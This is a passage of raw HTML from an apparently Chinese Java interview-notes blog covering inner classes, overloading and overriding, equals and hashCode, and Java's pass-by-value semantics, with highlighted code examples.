class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">定义在方法中的内部类，就是局部内部类。</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Outer</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> out_a = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">int</span> STATIC_b = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testFunctionClass</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> inner_c = <span class="number">3</span>;</span><br><span class="line">        <span class="class"><span class="keyword">class</span> <span class="title">Inner</span> </span>&#123;</span><br><span class="line">            <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">fun</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                System.out.println(out_a);</span><br><span class="line">                System.out.println(STATIC_b);</span><br><span class="line">                System.out.println(inner_c);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        Inner inner = <span class="keyword">new</span> Inner();</span><br><span class="line">        inner.fun();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">testStaticFunctionClass</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> d = <span class="number">3</span>;</span><br><span class="line">        classInner &#123;</span><br><span class="line">            <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">fun</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="comment">// System.out.println(out_a); 编译错误，定义在静态方 法中的局部类不可以访问外部类的实例变量</span></span><br><span class="line">                System.out.println(STATIC_b);</span><br><span class="line">                System.out.println(d);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        Inner inner = <span class="keyword">new</span> Inner();</span><br><span class="line">        inner.fun();</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br><span class="line">定义在实例方法中的局部类可以访问外部类的所有变量和方法，定义在静态方法中的局部类只能访问外部类的静态变量和方法。局部内部类的创建方式，在对应方法内，<span class="keyword">new</span>内部类()，如下：</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">testStaticFunctionClass</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Inner</span> </span>&#123;</span><br><span class="line">&#125;</span><br><span class="line">    Inner inner = <span class="keyword">new</span> Inner();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="6、匿名内部类"><a href="#6、匿名内部类" class="headerlink" title="6、匿名内部类"></a>6、匿名内部类</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">匿名内部类就是没有名字的内部类，日常开发中使用的比较多。</span><br><span class="line"> <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Outer</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">(<span class="keyword">final</span> <span class="keyword">int</span> i)</span> </span>&#123;</span><br><span class="line">                Service s = <span class="keyword">new</span> Service() &#123;</span><br><span class="line">                    <span class="comment">//重写接口里面的method方法</span></span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">method</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;匿名内部类&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;.method();  <span class="comment">//调用method方法</span></span><br><span class="line">                <span class="comment">// s.method;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//匿名内部类必须继承或实现一个已有的接口</span></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Service</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">method</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//主方法运行输出上面的结果</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    Outer o = <span class="keyword">new</span> outer();</span><br><span class="line">    o.method();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">除了没有名字，匿名内部类还有以下特点：</span><br><span class="line">• 匿名内部类必须继承一个抽象类或者实现一个接口。</span><br><span class="line">• 匿名内部类不能定义任何静态成员和静态方法。</span><br><span class="line">• 当所在的方法的形参需要被匿名内部类使用时，必须声明为 <span class="keyword">final</span>。</span><br><span class="line">• 匿名内部类不能是抽象的，它必须要实现继承的类或者实现的接口的所有抽象方法。</span><br><span class="line"></span><br><span class="line">匿名内部类创建方式：</span><br><span class="line"><span class="keyword">new</span> 类/接口 &#123;</span><br><span class="line"><span class="comment">//匿名内部类实现部分</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="7、内部类的优点"><a href="#7、内部类的优点" class="headerlink" title="7、内部类的优点"></a>7、内部类的优点</h2><p>我们为什么要使用内部类呢？因为它有以下优点：</p><ul><li>一个内部类对象可以访问创建它的外部类对象的内容，包括私有数据！</li><li> 内部类不为同一包的其他类所见，具有很好的封装性；</li><li> 内部类有效实现了“多重继承”，优化 java 单继承的缺陷。</li><li> 匿名内部类可以很方便的定义回调</li></ul><h2 id="8、内部类有哪些应用场景"><a href="#8、内部类有哪些应用场景" class="headerlink" title="8、内部类有哪些应用场景"></a>8、内部类有哪些应用场景</h2><ul><li>一些多算法场合</li><li> 解决一些非面向对象的语句块。</li><li>适当使用内部类，使得代码更加灵活和富有扩展性。</li><li>当某个类除了它的外部类，不再被其他的类使用时。</li></ul><h2 id="9、局部内部类和匿名内部类访问局部变量的时候，为什么变量必须要加上final？"><a href="#9、局部内部类和匿名内部类访问局部变量的时候，为什么变量必须要加上final？" class="headerlink" title="9、局部内部类和匿名内部类访问局部变量的时候，为什么变量必须要加上final？"></a>9、局部内部类和匿名内部类访问局部变量的时候，为什么变量必须要加上final？</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">内部原理:</span><br><span class="line">先看这段代码：</span><br><span class="line">        <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Outer</span> </span>&#123;</span><br><span class="line">            <span class="function"><span class="keyword">void</span> <span class="title">outMethod</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="keyword">final</span> <span class="keyword">int</span> a = <span class="number">10</span>;</span><br><span class="line">                <span class="class"><span class="keyword">class</span> <span class="title">Inner</span> </span>&#123;</span><br><span class="line">                    <span class="function"><span class="keyword">void</span> <span class="title">innerMethod</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                        System.out.println(a);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">因为生命周期不一致， 局部变量直接存储在栈中，当方法执行结束后，非 <span class="keyword">final</span> 的局部变量就被销毁。</span><br><span class="line">而局部内部类对局部变量的引用依然存在，如果局部内部类要调用局部变量时，就会出错。</span><br><span class="line">加了<span class="keyword">final</span>，可以确保局部内部类使用的变量与外层的局部变量区分开，解决了这个问题。</span><br></pre></td></tr></table></figure><h2 id="10、内部类相关，看程序说出运行结果"><a href="#10、内部类相关，看程序说出运行结果" class="headerlink" title="10、内部类相关，看程序说出运行结果"></a>10、内部类相关，看程序说出运行结果</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">        <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Outer</span> </span>&#123;</span><br><span class="line">            <span class="keyword">private</span> <span class="keyword">int</span> age = <span class="number">12</span>;</span><br><span class="line"></span><br><span class="line">            <span class="class"><span class="keyword">class</span> <span class="title">Inner</span> </span>&#123;</span><br><span class="line">                <span class="keyword">private</span> <span class="keyword">int</span> age = <span class="number">13</span>;</span><br><span class="line"></span><br><span class="line">                <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">print</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                    <span class="keyword">int</span> age = <span class="number">14</span>;</span><br><span class="line">                    System.out.println(<span class="string">&quot;局部变量：&quot;</span> + age);</span><br><span class="line">                    System.out.println(<span class="string">&quot;内部类变量：&quot;</span> + <span class="keyword">this</span>.age);</span><br><span class="line">                    System.out.println(<span class="string">&quot;外部类变量：&quot;</span> + Outer.<span class="keyword">this</span>.age);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">                Outer.Inner in = <span class="keyword">new</span> Outer().n<span class="function">ew <span class="title">Inner</span><span class="params">()</span></span>;</span><br><span class="line">                in.print();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//局部变量：14</span></span><br><span class="line"><span class="comment">//内部类变量：13</span></span><br><span class="line"><span class="comment">//外部类变量：12</span></span><br></pre></td></tr></table></figure><h1 id="gt-重写与重载"><a href="#gt-重写与重载" class="headerlink" title="&gt; 重写与重载"></a>&gt; 重写与重载</h1><h2 id="1、构造器（constructor）是否可被重写（override）"><a href="#1、构造器（constructor）是否可被重写（override）" class="headerlink" title="1、构造器（constructor）是否可被重写（override）"></a>1、构造器（constructor）是否可被重写（override）</h2><ul><li>构造器不能被继承，因此不能被重写，但可以被重载。</li></ul><h2 id="2、重载（Overload）和重写（Override）的区别-重载的方法能否根据返回类型进行区分？"><a href="#2、重载（Overload）和重写（Override）的区别-重载的方法能否根据返回类型进行区分？" class="headerlink" title="2、重载（Overload）和重写（Override）的区别? 重载的方法能否根据返回类型进行区分？"></a>2、重载（Overload）和重写（Override）的区别? 重载的方法能否根据返回类型进行区分？</h2><ul><li><p>区别：方法的重载和重写都是实现多态的方式，区别在于前者实现的是编译时的多态性，而后者实现的是运行时的多态性。</p></li><li><p>重载：发生在同一个类中，方法名相同参数列表不同（参数类型不同、个数不同、顺序不同），与方法返回值和访问修饰符无关，即重载的方法不能根据返回类型进行区分。</p></li><li><p>重写：发生在父子类中，方法名、参数列表必须相同，返回值小于等于父类，抛出的异常小于等于父类，访问修饰符大于等于父类（里氏代换原则）；如果父类方法访问修饰符为 private 则子类中就不是重写。</p></li></ul><h1 id="gt-对象相等判断"><a href="#gt-对象相等判断" class="headerlink" title="&gt; 对象相等判断"></a>&gt; 对象相等判断</h1><h2 id="1、-和-equals-的区别是什么？"><a href="#1、-和-equals-的区别是什么？" class="headerlink" title="1、== 和 equals 的区别是什么？"></a>1、== 和 equals 的区别是什么？</h2><ul><li><p>== : 它的作用是判断两个对象的地址是不是相等。即判断两个对象是不是同一个对象。(基本数据类型 == 比较的是值，引用数据类型 == 比较的是内存地址)</p></li><li><p>equals() : 它的作用也是判断两个对象是否相等。但它一般有两种使用情况：</p><ul><li>情况 1：类没有覆盖 equals() 方法。则通过 equals() 比较该类的两个对象时，等价于通过“==”比较这两个对象。</li><li>情况 2：类覆盖了 equals() 方法。一般我们都覆盖 equals() 方法来两个对象的内容相等；若它们的内容相等，则返回 true (即认为这两个对象相等)。</li></ul></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String a = <span class="keyword">new</span> String(<span class="string">&quot;ab&quot;</span>); <span class="comment">// a 为一个引用</span></span><br><span class="line">        String b = <span class="keyword">new</span> String(<span class="string">&quot;ab&quot;</span>); <span class="comment">// b 为另一个引用,对象的内容一样</span></span><br><span class="line">        String aa = <span class="string">&quot;ab&quot;</span>; <span class="comment">// 放在常量池中</span></span><br><span class="line">        String bb = <span class="string">&quot;ab&quot;</span>; <span class="comment">// 从常量池中查找</span></span><br><span class="line">        <span class="keyword">if</span> (aa == bb) <span class="comment">// true</span></span><br><span class="line">            System.out.println(<span class="string">&quot;aa==bb&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (a == b) <span class="comment">// false，非同一对象</span></span><br><span class="line">            System.out.println(<span class="string">&quot;a==b&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (a.equals(b)) <span class="comment">// true</span></span><br><span class="line">            System.out.println(<span class="string">&quot;aEQb&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="number">42</span> == <span class="number">42.0</span>) &#123; <span class="comment">// true</span></span><br><span class="line">            System.out.println(<span class="string">&quot;true&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>说明：</p><ul><li><p>String 中的 equals 方法是被重写过的，因为 object 的 equals 方法是比较的对象的内存地址，而 String 的 equals 方法比较的是对象的值。</p></li><li><p>当创建 String 类型的对象时，虚拟机会在常量池中查找有没有已经存在的值和要创建的值相同的对象，如果有就把它赋给当前引用。如果没有就在常量池中重新创建一个 String 对象。</p></li></ul><h2 id="2、hashCode-与-equals-重要"><a href="#2、hashCode-与-equals-重要" class="headerlink" title="2、hashCode 与 equals (重要)"></a>2、hashCode 与 equals (重要)</h2><ul><li>HashSet 如何检查重复<ul><li>HashSet底层结构是一个HashMap，HashSet将值放在HashMap的键中，如果HashMap的键相同时会发生覆盖，因此HashSet的值不会重复。</li><li>HashMap检查Key是否相同会通过equles方法，并通过比较hash值判断是否重复。</li></ul></li></ul><ul><li><p>两个对象的 hashCode() 相同，则 equals() 也一定为 true，对吗？</p><ul><li><p>两个对象的hashCode()相同，equals()不一定为true；</p></li><li><p>两个对象的equals为true，则两个对象的hashcode一定为true；</p><p>​    </p></li></ul></li><li><p>hashCode 和 equals 方法的关系</p><ul><li>1.hashCode()方法存在的主要目的就是提高效率。</li><li> 2.在集合中判断两个对象相等的条件，其实无论是往集合中存数据，还是从集合中取数据，包括如果控制唯一性等，都是用这个条件判断的，条件如下：</li><li>首先判断两个对象的hashCode是否相等，如果不相等，就认为这两个对象不相等，就完成了。</li><li>如果相等，才会判断两个对象的equals()是否相等，如果不相等，就认为这两个对象不相等，如果相等，那就认为这两个对象相等。</li></ul></li></ul><ul><li><p>你重写过 hashcode 和 equals 么，为什么重写 equals时必须重写 hashCode 方法？</p><ul><li>如果两个对象相等，则hashcode一定也是相同的。两个对象相等，对两个对象分别调用 equals()方法都返回 true。但是两个对象有相同的hashcode值，它们也不一定是相等的 。</li><li>因此equals()方法被覆盖过，则 hashCode()方法也必须被覆盖。</li><li>hashCode()的默认行为是对堆上的对象产生独特值。如果没有重写hashCode()，则该 class 的两个对象无论如何都不会相等（即使这两个对象指向相同的数据）。</li></ul><p>​    </p></li><li><p>hashCode()介绍</p><ul><li>hashCode() 的作用是获取哈希码，也称为散列码；它实际上是返回一个 int 整数。这个哈希码的作用是确定该对象在哈希表中的索引位置。hashCode() 定义在 JDK 的 Object.java 中，这就意味着 Java 中的任何类都包含有 hashCode()函数。</li><li>散列表存储的是键值对(key-value)，它的特点是：能根据“键”快速的检索出对应的“值”。这其中就利用到了散列码！（可以快速找到所需要的对象）</li></ul></li></ul><ul><li><p>为什么要有 hashCode</p><ul><li>我们以“HashSet 如何检查重复”为例子来说明为什么要有 hashCode：当你把对象加入 HashSet 时，HashSet 会先计算对象的 hashcode 值来判断对象加入的位置，同时也会与其他已经加入的对象的 hashcode 值作比较，如果没有相符的 hashcode，HashSet 会假设对象没有重复出现。</li><li>但是如果发现有相同hashcode 值的对象，这时会调用 equals()方法来检查 hashcode 相等的对象是否真的相同。如果两者相同，HashSet 就不会让其加入操作成功。如果不同的话，就会重新散列到其他位置。这样我们就大大减少了 equals 的次数，相应就大大提高了执行速度。</li></ul></li><li><p>hashCode()与 equals()的相关规定</p><ul><li>如果两个对象相等，则 hashcode 一定也是相同的两个对象相等，对两个对象分别调用 equals 方法都返回 true两个对象有相同的 hashcode 值，它们也不一定是相等的。**因此equals 方法被覆盖过，则 hashCode 方法也必须被覆盖 ** 。</li><li>hashCode() 的默认行为是对堆上的对象产生独特值。</li><li>如果没有重写hashCode()，则该 class 的两个对象无论如何都不会相等（即使这两个对象指向相同的数据）</li></ul></li><li><p>对象的相等与指向他们的引用相等，两者有什么不同？</p><ul><li>对象的相等 比的是内存中存放的内容是否相等而 引用相等 比较的是他们指向的内存地址是否相等。</li></ul></li></ul><h1 id="gt-值传递"><a href="#gt-值传递" class="headerlink" title="&gt; 值传递"></a>&gt; 值传递</h1><h2 id="1、当一个对象被当作参数传递到一个方法后，此方法可改变这个对象的属性，并可返回变化后的结果，那么这里到底是值传递还是引用传递"><a href="#1、当一个对象被当作参数传递到一个方法后，此方法可改变这个对象的属性，并可返回变化后的结果，那么这里到底是值传递还是引用传递" class="headerlink" title="1、当一个对象被当作参数传递到一个方法后，此方法可改变这个对象的属性，并可返回变化后的结果，那么这里到底是值传递还是引用传递?"></a>1、当一个对象被当作参数传递到一个方法后，此方法可改变这个对象的属性，并可返回变化后的结果，那么这里到底是值传递还是引用传递?</h2><ul><li>是值传递。Java 语言的方法调用只支持参数的值传递。</li><li>当一个对象实例作为一个参数被传递到方法中时，参数的值就是对该对象的引用。</li><li>对象的属性可以在被调用过程中被改变，但对对象引用的改变是不会影响到调用者的。</li></ul><h2 id="2、为什么-Java-中只有值传递"><a href="#2、为什么-Java-中只有值传递" class="headerlink" title="2、为什么 Java 中只有值传递"></a>2、为什么 Java 中只有值传递</h2><ul><li>按值调用(call by value)表示方法接收的是调用者提供的值，而按引用调用（call by reference)表示方法接收的是调用者提供的变量地址。</li><li>一个方法可以修改传递引用所对应的变量值，而不能修改传递值调用所对应的变量值。 </li><li>它用来描述各种程序设计语言（不只是 Java) 中方法参数传递方式。</li><li>Java 程序设计语言总是采用按值调用。</li><li>也就是说方法得到的是所有参数值的一个拷贝，方法不能修改传递给它的任何参数变量的内容。</li></ul><blockquote><p>举三个列子说明一下:</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//example 1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> num1 = <span class="number">10</span>;</span><br><span class="line">        <span class="keyword">int</span> num2 = <span class="number">20</span>;</span><br><span class="line">        swap(num1, num2);</span><br><span class="line">        System.out.println(<span class="string">&quot;num1 = &quot;</span> + num1);</span><br><span class="line">        System.out.println(<span class="string">&quot;num2 = &quot;</span> + num2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">swap</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> temp = a;</span><br><span class="line">        a = b;</span><br><span class="line">        b = temp;</span><br><span class="line">        System.out.println(<span class="string">&quot;a = &quot;</span> + a);</span><br><span class="line">        System.out.println(<span class="string">&quot;b = &quot;</span> + b);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//a = 20</span></span><br><span class="line"><span class="comment">//b = 10</span></span><br><span class="line"><span class="comment">//num1 = 10</span></span><br><span class="line"><span class="comment">//num2 = 20</span></span><br><span class="line"></span><br><span class="line">解析： </span><br><span class="line">在 swap 方法中，a、b 的值进行交换，并不会影响到 num1、num2。因为，a、b中的值，只是从 num1、num2 的复制过来的。</span><br><span class="line">也就是说，a、b 相当于 num1、num2 的副本，副本的内容无论怎么修改，都不会影响到原件本身。</span><br></pre></td></tr></table></figure><blockquote><p>通过example1的例子，我们已经知道了一个方法不能修改一个基本数据类型的参数，而对象引用作为参数就不一样，请看 example2</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//example2</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] arr = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;;</span><br><span class="line">        System.out.println(arr[<span class="number">0</span>]);</span><br><span class="line">        change(arr);</span><br><span class="line">        System.out.println(arr[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">change</span><span class="params">(<span class="keyword">int</span>[] array)</span> </span>&#123;</span><br><span class="line"><span class="comment">// 将数组的第一个元素变为 0</span></span><br><span class="line">        array[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//1</span></span><br><span class="line"><span class="comment">//0</span></span><br><span class="line"></span><br><span class="line">System.out.println(arr[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">change</span><span class="params">(<span class="keyword">int</span>[] array)</span> </span>&#123;</span><br><span class="line"><span class="comment">// 将数组的第一个元素变为 0</span></span><br><span class="line">array[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">解析： array 被初始化 arr 的拷贝也就是一个对象的引用，也就是说 array 和 arr指向的时同一个数组对象。 因此，外部对引用对象的改变会反映到所对应的对象上。</span><br></pre></td></tr></table></figure><blockquote><p>通过 example2 我们已经看到，实现一个改变对象参数状态的方法并不是一件难事。</p></blockquote><blockquote><p>理由很简单，方法得到的是对象引用的拷贝，对象引用及其他的拷贝同时引用同一个对象。</p></blockquote><blockquote><p>很多程序设计语言（特别是，C++和 Pascal)提供了两种参数传递的方式：值调用和引用调用。</p></blockquote><blockquote><p>有些人认为 Java 程序设计语言对对象采用的是引用调用，实际上，这种理解是不对的。</p></blockquote><blockquote><p>由于这种误解具有一定的普遍性，所以下面的example3的反例来详细地阐述一下这个问题。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//example3 </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">            Student s1 = <span class="keyword">new</span> Student(<span class="string">&quot;小张&quot;</span>);</span><br><span class="line">            Student s2 = <span class="keyword">new</span> Student(<span class="string">&quot;小李&quot;</span>);</span><br><span class="line">            Test.swap(s1, s2);</span><br><span class="line">            System.out.println(<span class="string">&quot;s1:&quot;</span> + s1.getName());</span><br><span class="line">            System.out.println(<span class="string">&quot;s2:&quot;</span> + s2.getName());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">swap</span><span class="params">(Student x, Student y)</span> </span>&#123;</span><br><span class="line">            Student temp = x;</span><br><span class="line">            x = y;</span><br><span class="line">            y = temp;</span><br><span class="line">            System.out.println(<span class="string">&quot;x:&quot;</span> + x.getName());</span><br><span class="line">            System.out.println(<span class="string">&quot;y:&quot;</span> + y.getName());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//x:小李</span></span><br><span class="line"><span class="comment">//y:小张</span></span><br><span class="line"><span class="comment">//s1:小张</span></span><br><span class="line"><span class="comment">//s2:小李</span></span><br><span class="line"></span><br><span class="line">解析： 方法并没有改变存储在变量 s1 和 s2 中的对象引用。swap 方法的参数 x 和 y 被初始化为两个对象引用的拷贝，这个方法交换的是这两个拷贝。</span><br></pre></td></tr></table></figure><blockquote><p>总结<br>Java 程序设计语言对对象采用的不是引用调用，实际上，对象引用是按值传递的。<br>下面再总结一下 Java 中方法参数的使用情况：</p><p>​    • 一个方法不能修改一个基本数据类型的参数（即数值型或布尔型》<br>​    • 一个方法可以改变一个对象参数的状态。<br>​    • 一个方法不能让对象参数引用一个新的对象。</p></blockquote><h2 id="3、值传递和引用传递有什么区别"><a href="#3、值传递和引用传递有什么区别" class="headerlink" title="3、值传递和引用传递有什么区别?"></a>3、值传递和引用传递有什么区别?</h2><ul><li>值传递：指的是在方法调用时，传递的参数是按值的拷贝传递，传递的是值的拷贝，也就是说传递后就互不相关了。</li><li>引用传递：指的是在方法调用时，传递的参数是按引用进行传递，其实传递的引用的地址，也就是变量所对应的内存空间的地址。<ul><li>传递的是值的引用，也就是说传递前和传递后都指向同一个引用（也就是同一个内存空间）。</li></ul></li></ul><h1 id="gt-Java包"><a href="#gt-Java包" class="headerlink" 